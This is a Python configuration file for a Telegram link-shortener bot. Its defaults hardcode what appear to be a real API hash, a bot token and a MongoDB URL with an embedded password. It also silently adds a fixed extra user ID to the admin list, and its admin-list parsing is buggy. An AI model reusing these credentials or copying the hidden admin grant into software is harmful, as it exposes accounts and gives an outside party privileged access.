# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "16217735"))
API_HASH = os.environ.get("API_HASH", "445a16e1f1554cc189673c6be5f5a72f")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "6730949368:AAGWx6WbIpqKVcdW4fPoGzlav1UysKwCxPA")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("5516632396")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "ronylinkbotz")
DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://hegodal811:EMH0rdiekAtr2gzZ@cluster0.8qjpdqn.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "5516632396")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(1255023013)

#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1001694968914")) 

# For Force Subscription
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "Updates Channel User name Without @")

# true if forward should be avoided
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True")

# image when someone hit /start
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", 'https://telegra.ph/file/489b50ef212a377828a3d.jpg')
LINK_BYPASS = "False"
